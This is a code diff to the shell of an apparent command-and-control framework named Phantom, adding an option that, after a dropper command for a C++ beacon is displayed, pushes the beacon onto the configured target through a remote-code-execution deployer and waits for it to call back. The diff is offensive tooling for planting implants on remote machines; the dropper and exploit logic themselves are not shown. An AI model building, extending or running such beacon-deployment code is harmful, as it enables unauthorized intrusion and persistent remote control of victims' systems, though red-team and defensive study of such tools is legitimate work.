@@ -226,7 +226,27 @@ class C2Shell(cmd.Cmd):
         console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')}[/]", border_style=style_map.get(platform, "white")))
         add_custom_beacon(platform, dropper, "Custom C++ Beacon", source="c2_shell")
 
-        notifier.info("Run the above command on the target to deploy the beacon.")
+        # Ask for automatic deployment
+        if session.target:
+            console.print()
+            deploy_choice = input(f"[?] Deploy to {session.target} now? [y/N]: ").strip().lower()
+            
+            if deploy_choice == 'y':
+                from phantom.utils.rce_deployer import deploy_beacon
+                console.print("\n[*] Initiating intelligent RCE deployment...")
+                success = deploy_beacon(session.target, dropper)
+                
+                if success:
+                    notifier.success(f"Beacon deployed to {session.target}. Check beacons list.")
+                    # Give time for beacon to callback
+                    import time
+                    time.sleep(2)
+                else:
+                    notifier.warn("Deployment via RCE failed. Copy command manually or try another method.")
+            else:
+                notifier.info("Beacon command ready. Run it manually on the target.")
+        else:
+            notifier.info("No target set. Run the command manually or set target first with 'set target <ip>'")
 
     def do_exit(self, arg):
         """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
